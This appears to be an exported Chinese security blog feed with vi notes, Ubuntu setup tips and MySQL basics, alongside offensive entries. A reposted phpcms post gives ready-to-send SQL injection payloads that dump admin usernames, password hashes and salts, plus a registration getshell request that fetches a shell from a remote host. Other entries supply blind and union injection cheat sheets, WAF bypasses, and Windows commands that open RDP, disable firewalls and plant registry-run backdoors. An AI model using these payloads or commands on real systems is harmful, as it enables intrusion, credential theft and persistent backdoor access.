    <content type="text"><![CDATA[如题 VI使用笔记文本查找12345678910111213/ 向下查找，输入n可以按相同的方向继续查找，N向相反的方向继续查找（notepad用F3）? 向上查找，同上，搜索字符串中如果包含由特殊含义的字符需要在前面加上\f 向下搜索某行中的单个字符F 向上搜索某行中的单个字符t 向下搜索，并把光标定位到匹配字符的前面T 向上搜索，并把光标定位到匹配字符的后面部分特殊字符列表：^ 匹配一行的开头. 匹配一个字符* 匹配0个或多个字符$ 匹配一行的结尾[] 匹配一组字符 移动光标：12h 向左 j 向下 k 向上 l 向右例：普通模式下输入3j，会向下移动3行 复制粘贴：12345yy 复制当前行nyy 复制n行yw 复制一个字（单词）p 将复制的文本粘贴到光标后面P 将复制的文本粘贴到光标前面 文本替换：123:s/search/replace/g 将当前行的所有search替换为replace:n,$s/old/new/g 将从第n行开始到最后一行的所有old替换为new（n若是&quot;.&quot;，表示从当前行开始到最后一行）:n,$s/old/new 将从第n行开始到最后一行的每一行的第一个old替换为new 模式切换：12两次ESC回到普通模式ZZ 保存并退出，方便快捷 插入字符：123456i 光标的前面插入I 当前行的开头插入文本a 光标的后面插入A 当前行的末尾插入文本o 在当前行的下一行插入空行O 在当前行的上一行插入空行 删除字符：1234567x 删除当前光标下的字符X 删除光标前面的字符dw 删除从当前光标到单次解围的字符d^ 删除从当前光标到行首的字符d$ 删除从当前光标到行尾的字符D 删除从当前光标到行尾的字符dd 删除当前光标所在的行，3dd删除3行 修改字符：1234567cc 删除当前行并进入编辑模式C 当前行的光标所在位置清空并进行编辑cw 删除当前字（单词），并进入编辑模式r 替换当前光标下的字符（替换单个字母用）R 从当前光标开始替换字符，按ESC退出s 用输入的字符替换当前字符，并进入编辑模式S 用输入的文本替换当前行，并进入编辑模式 屏幕移动：123H移动到屏幕顶部，nH移动到屏幕第n行的位置M移动到屏幕中间L移动到屏幕底部 文章移动命令：12345678910gg跳到文档开头G跳到文档结尾，1G 或 :1 移动到文件第一行0或|回车，跳到当前行开头$跳到当前行结尾w定位到上一个单词b定位到下一个单词(定位到一句话的开头，句子是以!.?三种符号来界定)定位到一句话的结尾&#123;移动到段落开头&#125;移动到段落结尾 控制命令：1234567ctrl+d 向后滚动半屏ctrl+f 向后滚动全屏ctrl+u 向前滚动半屏ctrl+b 向前滚动整屏ctrl+e 向下滚动一行ctrl+y 向上滚动一行ctrl+I（大写的i）刷新屏幕 高级命令1234567891011121314151617J 将当前行和下一行链接为一行&lt;&lt; 将当前行左移一个单位（一个缩进宽度）&gt;&gt; 将当前行右移一个单位~ 改变当前字符的大小写ctrl+G 可以显示当前文件名和状态U 撤销对当前行所做的修改u 撤销上次操作:f 以百分比的形式显示当前光标在文中的位置、文件名和文件的总行数:f filename 将文件重命名为filename:w filename 保存修改到filename:e filename 打开另一个名为filename的文件:cd dirname 改变当前工作目录到dirname:e # 在的两个打开的文件之间进行切换:n 如果用vi打开了多个文件，切换到下一个文件:p 如果用vi打开了多个文件，切换到上一个文件:r file 读取文件并在当前行的后面插入:nr 读取文件并在第n行后面插入]]></content>
      <categories>
        <category>vi</category>
      </categories>
      <tags>
        <tag>vi</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpcms漏洞利用【转载】]]></title>
    <url>%2F2017%2F08%2F31%2FphpcmsLoopholes%2F</url>
    <content type="text"><![CDATA[如题所示 phpcms漏洞 最近某位大牛说，将放出3个phpcms的0day漏洞，目前我所了解到的已经有2个phpcms漏洞被流传开来，并放出了poc。phpcms应用范围还是比较广的，在此记录分享一下几个最新的phpcms漏洞。 免责申明：文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负phpcms 任意文件读取漏洞 更新于2017年5月4日漏洞具体细节参考：http://bobao.360.cn/learning/detail/3805.html 漏洞利用方案一：登录普通用户，访问链接：1http://localhost/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&amp;f=p%3%25252%2*70C 获取分配的att_json,然后将这段json值带入到down类的init函数中去： 1http://localhost/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=013ceMuDOmbKROPvvdV0SvY95fzhHTfURBCK4CSbrnbVp0HQOGXTxiHdRp2jM-onG9vE0g5SKVcO_ASqdLoOSsBvN7nFFopz3oZSTo2P7b6N_UB037kehz2lj12lFGtTsPETp-a0mAHXgyjn-tN7cw4nZdk10Mr2g5NM_x215AeqpOF6_mIF7NsXvWiZl35EmQ 方案二：在未登录的情况下访问：1http://localhost/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1 获取当前的siteid,然后再访问: 12http://localhost/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&amp;f=p%3%25252%2*70CPOST_DATA:userid_flash=14e0uml6m504Lbwsd0mKpCe0EocnqxTnbfm4PPLW 修复方案升级至官方最新版本 phpcms sql漏洞Poc存在sql注入漏洞的页面： 1http://192.168.1.139:8080/phpcms/index.php?m=member&amp;c=index&amp;a=login 获取当前数据库，post： 1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bdatabase())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取当前用户，post： 1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2buser())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取表名：1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2btable_name%2bfrom%2binformation_schema.tables%2bwhere%2btable_schema=&apos;phpcmsv9&apos;%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 若要获取其他表名，修改limit即可。 获取用户名:1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2busername%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取密码1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bpassword%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取到的密码为30位的md5，一般的MD5是32位，所以我们需要再获取后2位：1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(substring((select%2bpassword%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c-2%252c2))%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 phpcms是加盐（salt）的，获取salt:1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bencrypt%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 以上Poc来自：https://www.unhonker.com/bug/1834.html exp漏洞利用脚本exp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：https://www.seebug.org/monster/exp脚本可以参考：https://www.waitalone.cn/phpcmsv9-authkey-exp.html漏洞细节请参考：http://mp.weixin.qq.com/s/cI-wbQyX-3WLhxJ5kqez4A 漏洞修复方案去掉modules\content\down.php文件 phpcms注册页面getshell漏洞存在的漏洞：php远程文件包含、任意文件上传 漏洞利用点：phpcms注册页面 利用类型：http post请求导致任意文件上传+getshell Post Poc1siteid=1&amp;modelid=11&amp;username=newbie&amp;password=newbie&amp;email=newbie@qq.com&amp;info[content]=&lt;img src=http://shhdmqz.com/newbie.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol= 注意：http://shhdmqz.com/newbie.txt为远程服务器上的shell文件，这个漏洞利用了远程文件包含与文件上传漏洞。 漏洞利用细节 访问注册页面发送post包，重构info字段内容，写入远程包含的文件地址《img src=http://shhdmqz.com/newbie.txt?.php#.jpg》，newbie.txt为文件名，?.php#.jpg为构造的文件名，为了绕过后缀名限制。回包将会有报错信息，但文件可以上传成功，且报错信息中含有上传的文件路径，可用菜刀链接。 exp漏洞利用脚本exp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：https://www.seebug.org/monster/ 漏洞修复方案暂时性修复： 关闭注册页面关闭远程文件包含，即关闭allow_url_fopen 彻底性修复： 12345修改phpcms/libs/classes/attachement.class.php文件中的download函数在foreach($remotefileurls as $k=&gt;$file)循环中，大约是167行左右的位置，将if(strpos($file, &apos;://&apos;) === false || strpos($file, $upload_url) !== false) continue; $filename = fileext($file);修改成$filename = fileext($k); 关于文件包含漏洞，可参考：文件包含漏洞 任意文件读取漏洞1index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=..\/..\/caches/error_log.php phpcms敏感信息1234默认账号密码：phpcms/phpcms默认后台： http://www.xx.com/index.php?m=admin&amp;c=index&amp;a=login&amp;pc_hash=会员中心地址：index.php?m=member&amp;c=index&amp;a=login本篇将持续跟踪phpcms最新漏洞状况，并附上检测方法以及修复方案，协助管理员早日修复漏洞，谢谢！ 本文标题:phpcms漏洞文章作者:nMask发布时间:2017年04月12日 - 09:04最后更新:2017年07月25日 - 20:07原始链接:http://thief.one/2017/04/12/1/许可协议: 署名-非商业性使用-禁止演绎 4.0 国际 转载请保留原文链接及作者。]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>-phpcms -漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu安装完成可以做的一些事]]></title>
    <url>%2F2017%2F08%2F29%2FnewUbuntu%2F</url>
    <content type="text"><![CDATA[如题所示 可以做的有：1、换源根据自己安装的Ubuntu版本，去网上找相应的源，源文件位置：/etc/apt/source.list这里给出Ubuntu14.04搜狐源： 12345678910deb http://mirrors.sohu.com/ubuntu/ trusty main restricted universe multiversedeb http://mirrors.sohu.com/ubuntu/ trusty-security main restricted universe multiversedeb http://mirrors.sohu.com/ubuntu/ trusty-updates main restricted universe multiversedeb http://mirrors.sohu.com/ubuntu/ trusty-proposed main restricted universe multiversedeb http://mirrors.sohu.com/ubuntu/ trusty-backports main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty-security main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty-updates main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty-proposed main restricted universe multiversedeb-src http://mirrors.sohu.com/ubuntu/ trusty-backports main restricted universe multiverse 将上面内容复制后，输入1sudo vim /etc/apt/source.list 编辑源文件，在命令行模式下按p进行粘贴，输入:wq回车，进行保存 12sudo apt-get update #更新软件索引列表sudo apt-get upgrade #更新所有软件（不建议） 2、安装SSH、FTP、Telnet（有的系统会自行安装） 先尝试service /etc/init.d/ssh start 或者 cd /etc/init.d 再service ssh start 若是无回显则ssh开启， service ssh status 查看ssh状态 若是出错则sudo apt-get install ssh 进行安装 安装完成后再执行上面的操作 apt-get install vsftpd 安装ftp服务器 3、安装 vmware tools图形化的可以在页面上点击安装vmware-tools进行安装 命令行可以apt-get install open-vm-tools-desktop fuse 4、安装截图工具ksnapshotapt-get install ksnapshot使用命令 ksnapshot-region 可以截屏，将该命令设置为快捷键方别使用 5、重新安装vim1234567891011121314apt-get remove vim-common #删除原版apt-get install vim #安装新版#简单配置VIMvim /etc/vim/vimrc#设置语法高亮:命令行模式下输入/syn 找到 syntax on 这一行，去掉前面的双引号（双引号是注释的意思）添加行号命令行模式下shift+g跳到末尾行，添加新行：set nu自动缩进文本末尾添加一行：set autoindent 自动缩进再添加一行：set cindent 针对C语言自动缩进#设定缩进set tabstop=4 #设定tab键缩进的空格数set shiftwidth=4 #设定编辑器将多少空格视为一个缩进 6、支持Xshell进行上传下载12apt-get install rpmapt-get install lrzsz 7、redis-toolsapt-get install redis-tools 渗透工具安装：123456789101112131415netdiscover 用来嗅探存活主机apt-get netdiscover 安装命令netdiscover -r 192.168.1.0/24 扫描本地网络主机nmap apt-get install nmap whatwebapt-get install whatweb CMS识别hydraapt-get install hydra 密码破解proxychainsapt-get install proxychains 端口代理redsktopapt-get install rdesktop 远程登录windows安装sqlmap/metasploit/wpscan]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows下解决图片上传的麻烦]]></title>
    <url>%2F2017%2F08%2F29%2FsolveHexoImage%2F</url>
    <content type="text"><![CDATA[众所周知，markdown添加图片要先上传，再复制图片链接。这里给出了一种简单的解决办法，可以一步实现上传和生成连接 Hexo_MD + 七牛API+MPic图床神器 注册账号 你要到七牛官网上注册一个七牛个人账号，经过支付宝认证之后可以获得10G的免费储存空间。 创建一个对象储存空间，作为分享图片的仓库创建选项中只需要注意选择公开空间即可，其它的无所谓。 创建结束后检查一下空间的图片保护选项是否关闭，如果没有关闭，就手动关闭一下。 下载软件：Mpic 图床神器。 下载完成后，设置账号——》设置如下图 具体配置： 七牛空间名就是创建的空间名称 AccessKey和SecretKey在个人中心可以看到，复制进来 域名是创建的空间的域名 设置完成后，需要上传图片的时候，打开软件，复制或者截图就会自动上传并生成图片链接了（在屏幕右下角有程序图标，右键可以开启或关闭自动上传功能）]]></content>
      <categories>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>markdown</tag>
        <tag>图床</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql布尔盲注payload]]></title>
    <url>%2F2017%2F08%2F26%2FboolBlandSQLInjection%2F</url>
    <content type="text"><![CDATA[如题所示 payload12345678910111213141516#判断当前数据库长度?id=12&apos; and (select length(database())&gt;5) --+#判断当前数据库名?id=12&apos; and (select ascii(substr(database(),1,1))&gt;=97) --+#判断第一个表的表长度?id=12&apos; and (select length(table_name)&gt;5 from information_schema.tables where table_schema=database() limit 0,1) --+ #判断第二个表名?id=12&apos; and (select ascii(substr(table_name,1,1))&gt;97 from information_schema.tables where table_schema=database() limit 1,1) --+ #判断users表的第一个字段长度?id=12&apos; and (select length(column_name)&gt;1 from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 0,1) --+ #判断users表的第一个字段名?id=12&apos; and (select ascii(substr(column_name,1,1))&gt;65 from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 0,1) --+ #判断username列的第一条数据长度?id=12&apos; and (select length(username)&gt;1 from users limit 0,1) --+ #判断username列的第一条数据?id=12&apos; and (select ascii(substr(username,1,1))&gt;=65 from users limit 0,1) --+]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>布尔盲注</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL手工联合查询注入]]></title>
    <url>%2F2017%2F08%2F26%2FMySQLUnionInjection%2F</url>
    <content type="text"><![CDATA[内容如题 PHP+MySQL简单手工注入基本流程一、判断是否存在注入1234567891011SQL注入按类型分为两种：数字型和字符型判断方法的区别：字符型用&apos;判断，数字型用and 1=1 和and 1=2判断注释方法：# 编码后为%23，hash语法-- s 后跟空格后面随意写字符，又例：--+-- - SQL语法;%00 可以使用，空字节/* 必须闭合，C-style语法 · 反引号（左上角的字符） 判断sql注入（显错和基于错误的盲注）：单引号，and 1=1 和and 1=2，双引号，反斜杠，注释等 判断基于时间的盲注:在上面的基础上，加个sleep函数 ，如sleep(5) (函数不同数据库有所不同)例子： &apos; and sleep(5) &quot; and sleep(5) 二、判断有几列数据1234567891011121314151617order by 1 #一直到出现错误为止and 1=2 union select 1,2 #一直到成功为止，一般页面会出现显示位，出现显示位的地方可以放我们想要放的东西，例如：user(),database(),@@version，则会在显示位出现连接的用户、数据库、版本等信息可以放的东西：database(),schema() #数据库名user(),current_user(),current_user,system_user(),session_user() #用户@域名@@version,version(),@@global.version #mysql版本信息@@basedir #mysql安装路径@@datadir #数据库存放路径@@hostname #主机名@@version_compile_os; #操作系统指纹@@global.version_compile_os #感觉和上面差不多now() #当前时间：年月日时分秒current_date #当前时间：年月日char() #指定字符load_file() #读取指定文件ord(mid(user(),1,1))=114 #系统权限，正常返回说明为root小工具：火狐F9——》SQL——》union select statement——》输入数字，直接出现联合查询，方便爆出列数 三、得到数据库名1234561、使用database()直接得到当前数据库名2.1 如果database()被过滤，则使用union select 1,schema_name,3,4,5,6 from information_schema.schemata limit 0,1 查看数据库名，可以通过Limit设置显示第几行，也就可以显示其他的数据库名。根据数据库名爆表名（如果database()）被过滤 2.2 UNION SELECT 1,group_concat(schema_name),3,database(),5,6 from information_schema.schemata 显示所有数据库名，函数group_concat是显示所有 2.3 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; MySQL 4版本时用version=9，MySQL 5版本时用version=10 Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息 四、得到表名1231、UNION SELECT 1,table_name,3,4,5,6 from information_schema.tables where table_schema=&apos;s10&apos; limit 0,1 #显示s10数据库的表名，一个一个来2、union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=&apos;s10&apos; #显示s10数据库的表名，全部显示3、SELECT table_name FROM information_schema.tables WHERE table_name LIKE &apos;%user%&apos; #查询包含user的表 五、得到列名12341、UNION SELECT 1,2,3,database(),5,column_name from information_schema.columns where table_schema=&apos;s10&apos; and table_name=&apos;users&apos; limit 0,1 #查询列名，一个一个来2、union select 1,2,3,4,5,group_concat(column_name) from information_schema.columns where table_schema=&apos;s10&apos; and table_name=&apos;users&apos; #查询列名，一次全部显示3、SELECT column_name FROM information_schema.columns WHERE table_name LIKE &apos;%user%&apos; #查询包含user的列4、SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE() 获得第一个段名 1 LIMIT 1,1 PROCEDURE ANALYSE() 获得第二个段名 1 LIMIT 2,1 PROCEDURE ANALYSE() 获得第三个段名 #这个需要web展示页面有你所注入查询的一个字段。 六、得到想要的数据1231、union select 1,username,password,4,5,6 from users; #在不同的显示位显示需要的内容2、union select 1,concat(userename,0x23,password),3,4,5,6 from users; #函数concat可以联合显示数据，0x23是分隔符3、union select 1,concat_ws(0x23,username,email,age,password),3,4,5,6 from users #函数concat_ws只写一次分隔符即可]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>联合查询</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开启3389命令]]></title>
    <url>%2F2017%2F08%2F26%2Fopen3389%2F</url>
    <content type="text"><![CDATA[远程cmd开启3389，以及开启成功依旧不能登录的解决方法 开启命令：12345678910111213141516正常命令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f远程使用时，需要变为双斜杠：REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f查看远程连接端口号REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber添加后门：Reg enumkey –k HKLM\\software\\microsoft\\windows\\currentVersion\\run 查看注册表的自启动项Reg setval –k 注册表路径 –v 文件名 –d “文件路径” 将后门添加到注册表启动项关闭TCP/IP端口筛选 (需重启) tcp/ip筛选是让用户设置电脑的可接收和不能接收的TCP/IP端口，保证安全REG ADD HKLM\SYSTEM\ControlSet001\Services\Tcpip\parameters /v EnableSecurityFilters /t REG_DWORD /d 0 /f更改终端端口为3800(0x0ED8)REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x0ED8 /fREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x0ED8 /f 开启失败可以尝试：关闭ip安全策略： 1cmd /c net stop policyagent 将IPSEC Services服务停了 防火墙相关： 12345678910111213141516查看防火墙状态：netsh firewall show state禁用防火墙（以管理员运行）：netsh firewall set opmode disable启用防火墙：netsh firewall set opmode enable防火墙重置：netsh advfirewall reset允许文件和打印共享 ：netsh firewall add portopening UDP 137 Netbios-ns (允许客户端访问服务器UDP协议的137端口) netsh firewall add portopening UDP 138 Netbios-dgm (允许访问UDP协议的138端口) netsh firewall add portopening TCP 139 Netbios-ssn (允许访问TCP协议的139端口) netsh firewall add portopening TCP 445 Netbios-ds (允许访问TCP协议的445端口) 添加3389对外开放规则：netsh firewall set portopening TCP 3389 ENABLE 允许netsh firewall set portopening TCP 3389 DISABLE 禁止]]></content>
      <categories>
        <category>3389</category>
      </categories>
      <tags>
        <tag>3389</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库基础学习]]></title>
    <url>%2F2017%2F08%2F26%2Fmysql-basic%2F</url>
    <content type="text"><![CDATA[罗列了一些MySQL的常用语句命令，可以进来看看1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586select user,host,password from mysql,user #查看mysql的用户和密码mysql -hlocalhost -uroot -p #连接数据库show databases; #显示数据库select database(); #显示当前使用的数据库select user(); #显示当前用户select version(): 或者select @@version; #显示版本use 数据库名; #选择数据库select @@basedir; #显示mysql安装路径select @@datadir; #显示数据库存放的路径select @@hostname; #显示主机名select @@version_compile_os; #显示mysql操作系统版本select now(); #显示当前时间create database 数据库名 character set utf8; #创建数据库drop database 数据库名; #删除数据库create table users(id int(10) unsigned not null primary key auto_increment, username varchar(30) not null, email varchar(30) not null, password varchar(32) not null)default charset=utf8; #创建表（id是无符号整数类型）create table me like users; #创建表me，结构与users表一致show tables; #查看表desc users; #查看表结构insert into users(username,email,password) values('admin','1','123'); #插入表数据select hex('admin') #查看admin字符的16进制，使用时前面加上0x，例：select * from users where user=0x61646d696e;select * from users limit 2; #查询前两条信息select * from users limit 2,2; #查询第三条和第四条两条（从第三条开始，查询两条）select * from users where username like '%admin%'; #查询用户名包含admin的所有信息（这里的%是like查询中的通配符，用来匹配所有字符，所以用户名中包含admin的全部都能显示出来）select * from users where username='admin'; #查询用户名是admin的信息update users set username='admin' where id=1; #修改id为1的用户名为admindelete from users where id=12; #删除id为12的数据select * from users where id=1 union select * from users where id=3; #联合查询，可以查询多条，要求各边查询的列数一致select * from users order by 1; #根据第一列排序（可以以此为查询列数的依据）select * from users where id=-1 union select 1,2,user(),4; #联合查询，只显示后面的查询结果，前面的查询结果为空，所以不显示select * from users where id=1 and 1=2 union select 1,2,user(),4; #同上create table ec_users(id int(10) primary key auto_increment,username varchar(32) not null,count_tmp float not null,dept varchar(32) not null)default charset=utf8; #创建表select dept,count(*) from ec_users where count_tmp&gt;=90 group by dept having count(dept)&gt;1; #统计每个部门成绩大于90的人数select DISTINCT username from ec_users; #distinct用来去除重复数据select all dept from ec_users #all表示查询所有（默认为all，重复的也显示）select * from ec_users where dept is null #查询部门值为空select * from ec_users where dept is not null #查询部门值不为空select * from ec_users where id BETWEEN 3 and 5 #查询id为3~5之间的数据select * from ec_users where id in(1,2,6) #查询id值为1,2,6的数据（过waf有用）select * from ec_users where id=1 or 'a' in ('b','a'); #过waf用，后面恒为真，'a'字符存在在in('a')里select * from ec_users where id=1 &amp;&amp; id&lt;3; #查询id=1且id&lt;3的select * from ec_users where id=1 | id&lt;3; #过waf用一个|或一个&amp;可以显示select * from ec_users where id xor 0; #异或，两个均为真显示0，两个不同为1select * from ec_users where id not in(1,2,3) #not与！是一个用处，可以用在in、likealter table users add age int(3) not null; #添加列alter table users modify age int(4) #修改列的数据类型为int(4)alter table users change age age int(3) #同上，也是修改列的数据类型，只是需要写两次列名alter table users rename ress; #修改表名alter table users rename as ress; #同上，也是修改表名select count(*) from information_schema.tables #返回系统表里的数据个数select rand() #返回0~1之间的随机浮点数select rand()*4 #返回0~4之间的随机浮点数select floor(rand()*4) #随机生成0~4（不可能是4）之间的整数 select floor(rand()*4）as dumb #并命名为dumb列（as可省略）#if用法：select if (判断条件,'语句1','语句2') #条件为真执行语句1，条件为假执行语句2#十六进制：SELECT 0x5045 #(这不是一个整数，而会是一个16进制字符串）SELECT 0x50 + 0x45 #(现在这是整数了)select concat('0x',hex('c:\\boot.ini')) #另类的使用十六进制方式#字符串的串联|| 仅在ANSI模式下的MySQL执行，其他情况下都会当成逻辑操作符并返回0，建议使用下面函数concat() concat_ws() group_concat()#绕过MD5哈希检查的例子用户名：admin密码：1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055其中81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)grant 权限1,权限2...,权限n on 数据库名.表名 to 用户名@用户地址 identified 